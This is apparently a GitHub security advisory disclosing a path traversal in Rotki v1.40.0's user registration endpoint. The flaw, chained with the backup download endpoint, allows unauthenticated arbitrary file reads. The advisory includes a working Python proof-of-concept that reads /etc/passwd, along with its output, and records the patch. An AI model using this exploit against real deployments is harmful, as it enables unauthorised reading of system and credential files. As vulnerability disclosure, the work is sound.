# GHSA-73h4-xwvc-g83w


#### Summary

The user registration endpoint at `/api/1/users` in Rotki v1.40.0 is vulnerable to path traversal. When combined with the database backup download feature at `/api/1/database/backups`, this allows unauthenticated attackers to read arbitrary files from the application filesystem in directories where the application process has write permissions.

#### Details

In Rotki, the `PUT /api/1/users` API endpoint is used to register a new user. The route calls `RestAPI.create_new_user()` which in turn calls `Rotkehlchen.unlock_user()` and `DataHandler.unlock()`. Within this function, the application attempts to create an SQLite database for the new user, using the supplied username as a directory name:

```py
    def unlock(
            self,
            username: str,
            password: str,
            create_new: bool,
            resume_from_backup: bool,
            initial_settings: ModifiableDBSettings | None = None,
    ) -> Path:
        ...
        user_data_dir = self.data_directory / USERSDIR_NAME / username
        if create_new:
            try:
                if (user_data_dir / USERDB_NAME).exists():
                    raise AuthenticationError(
                        f'User {username} already exists. User data dir: {user_data_dir}',
                    )

                user_data_dir.mkdir(parents=True, exist_ok=True)
            except PermissionError as e:
                ...
        else:
            ...
            
        self.db: DBHandler = DBHandler(
            user_data_dir=user_data_dir,
            password=password,
            msg_aggregator=self.msg_aggregator,
            initial_settings=initial_settings,
            sql_vm_instructions_cb=self.sql_vm_instructions_cb,
            resume_from_backup=resume_from_backup,
        )
        self.user_data_dir = user_data_dir
        self.logged_in = True
        self.username = username
        return user_data_dir
```

If the SQLite database is able to be created (i.e the server process has write permissions in the directory), then the resulting directory is stored in the `user_data_dir` attribute. Since the username is supplied by the user and does not undergo sanitization, an attacker can insert path traversal characters into the username in order to set `user_data_dir` to a directory of their choosing.

The `GET /api/1/datbase/backups` endpoint can then be used to read arbitrary files from the application server. Under normal circumstances, the server checks that the requested path is located under the `user_data_dir`. However since the attacker can use the path traversal vulnerability to control `user_data_dir`, they can bypass this check.
```py
    def download_database_backup(self, filepath: Path) -> Response:
        if filepath.parent != self.rotkehlchen.data.db.user_data_dir:
            error_msg = f'DB backup file {filepath} is not in the user directory'
            return api_response(wrap_in_fail_result(error_msg), status_code=HTTPStatus.CONFLICT)

        return send_file(
            path_or_file=filepath,
            mimetype='application/octet-stream',
            as_attachment=True,
            download_name=filepath.name,
        )
```

#### PoC

The following script reads `/etc/passwd` from the application filesystem. This assumes that Rotki is running as root, which is the default case in the Rotki Docker image.

```py
#!/usr/bin/env python3
import requests
import os
RHOST = "http://localhost:8084"

def arb_read(s, path):
    traversed_path = f"../../../../../../../../..{path}"
    dirname = os.path.dirname(traversed_path) + "/"
    s.put(
        f"{RHOST}/api/1/users",
        json={
            "name": dirname,
            "password": "password",
        },
    )

    r = s.get(
        f"{RHOST}/api/1/database/backups",
        params={"file": f"/data/users/{traversed_path}"},
    )
    print(r.text)
    return r.text


def main():
    s = requests.Session()
    arb_read(s, "/etc/passwd")

if __name__ == "__main__":
    main()
```

```sh
❯ python arb_read.py 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
nginx:x:101:101:nginx user:/nonexistent:/bin/false
```

#### Impact

Unauthenticated attackers are able to read arbitrary files from the application filesystem in directories where the server process has write permissions.

#### Timeline

- September 8 2025: Initial disclosure to Rotki
- September 9 2025: Patch implemented and merged in PR [#10580](https://github.com/rotki/rotki/pull/10580)
